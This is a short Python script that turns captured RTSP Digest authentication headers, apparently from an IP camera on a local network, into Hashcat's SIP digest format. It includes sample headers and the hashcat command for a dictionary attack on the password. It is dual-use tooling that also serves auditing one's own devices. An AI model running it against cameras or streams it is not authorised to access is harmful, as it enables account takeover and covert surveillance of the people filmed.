import hashlib

# Authorization: Digest username="admin", realm="Login to 4H01D66PAJ2FA64", nonce="89df19959b080fe8cc592d03fb9e476d", uri="rtsp://192.168.1.108:554", response="0ed422346297a1a4862ffa8eb9c28111"
# Authorization: Digest username="admin", realm="Login to 4H01D66PAJ2FA64", nonce="89df19959b080fe8cc592d03fb9e476d", uri="rtsp://192.168.1.108:554/", response="4cb4da176e825d0317f6d4c479db1aa2"
# Authorization: Digest username="admin", realm="Login to 4H01D66PAJ2FA64", nonce="89df19959b080fe8cc592d03fb9e476d", uri="rtsp://192.168.1.108:554", response="3f2244ce1396861a83cbbaf92f766dc8"

# CRACKING A RTSP SESSION
#
# Get the 'Authorization' header of a RTSP packet like the ones illustrated above.
# Also make sure to record the method (e.g. OPTIONS, DESCRIBE, SETUP, PLAY, etc.)
#
# Next, run the generate_target function in this script with the header's values
# and the method. This will output it to a Hashcat compatible format in a target.txt file.
#
# Then the password can be cracked using any Hashcat attack mode. One basic method
# is the straight method, which simply tries a list of passwords. Put the passwords
# in a dictionary.txt and run the following command:
#
# hashcat -m 11400 -a 0 target.txt dictionary.txt

# Various hashcat + HTTP digest authentication sources:
# https://www.reddit.com/r/HowToHack/comments/p5jg9t/question_about_using_hashcat_to_crack_http_digest/
# https://hashcat.net/wiki/doku.php?id=example_hashes
# https://github.com/hashcat/hashcat/issues/1021
# https://hashcat.net/forum/archive/index.php?thread-6571.html
# https://github.com/hashcat/hashcat/blob/master/src/modules/module_11400.c
# https://hashcat.net/forum/printthread.php?tid=6768


def digest_hash(username, realm, password, method, uri, nonce):
    ha1_pre = username + ":" + realm + ":" + password
    ha2_pre = method + ":" + uri

    ha1 = hashlib.md5(ha1_pre.encode())
    ha2 = hashlib.md5(ha2_pre.encode())

    response_pre = ha1.hexdigest() + ":" + nonce + ":" + ha2.hexdigest()
    response = hashlib.md5(response_pre.encode())

    return response.hexdigest()


def generate_target(username, realm, method, uri, nonce, hash):
    format = f"$sip$***{username}*{realm}*{method}**{uri}**{nonce}****MD5*{hash}"
    file = open("target.txt", "w")
    file.writelines(format)
    file.close()


generate_target("admin", "Login to 4H01D66PAJ2FA64", "DESCRIBE", "rtsp://192.168.1.108:554",
                "89df19959b080fe8cc592d03fb9e476d", "3f2244ce1396861a83cbbaf92f766dc8")
